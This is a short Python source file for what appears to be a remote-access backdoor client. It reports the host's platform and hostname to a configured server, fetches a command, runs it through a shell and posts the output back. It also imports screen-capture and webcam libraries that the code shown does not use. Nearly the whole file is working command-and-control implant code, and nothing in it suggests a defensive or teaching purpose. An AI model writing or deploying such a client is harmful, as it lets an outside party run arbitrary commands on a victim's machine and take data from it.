# coding: gb18030

import time
import os
import subprocess
import platform
import shutil
import requests
import sys
import traceback
import threading
import uuid
from io import StringIO
import zipfile
import tempfile
import socket
import getpass

import cv2

if os.name == 'nt':
    from PIL import ImageGrab
else:
    import pyscreenshot as ImageGrab

import config


class Client(object):

    def __init__(self):
        self.platform = platform.system() + " " + platform.release()
        # self.uid = self.get_UID()
        self.hostname = socket.gethostname()
        # print({'platform': self.platform, 'hostname': self.hostname})

    def server_hello(self):
        """ Ask server for instructions """
        req = requests.post(config.SERVER + '/hello',
                            json={'platform': self.platform, 'hostname': self.hostname})
        print(req.text)
        return req.text

    def send_output(self, output, newlines=True):
        """ Send console output to server """
        if not isinstance(output, str):
            output = output.decode("gb18030")
            print(output)
        req = requests.post(config.SERVER + '/report',
                            data={'output': output})

    def runcmd(self, cmd):
        """ Runs a shell command and returns its output """
        try:
            proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE)
            out, err = proc.communicate()
            output = (out + err)
            #print(output)
            self.send_output(output)
        except Exception as exc:
            self.send_output(traceback.format_exc())

    def run(self):
        """ Main loop """
        while True:
            try:
                todo = self.server_hello()
                # Something to do ?
                if todo:
                    commandline = todo
                    self.send_output('$ ' + commandline)
                    split_cmd = commandline.split(" ")
                    command = split_cmd[0]
                    args = []
                    if len(split_cmd) > 1:
                        args = split_cmd[1:]
                    try:
                        self.runcmd(commandline)
                    except Exception as exc:
                        self.send_output(traceback.format_exc())
                else:
                    print("对服务端say hello了它没听到")
            except Exception as exc:
                print("command exec error")


def main():
    agent = Client()
    command = agent.server_hello()
    agent.runcmd(command)


if __name__ == "__main__":
    main()
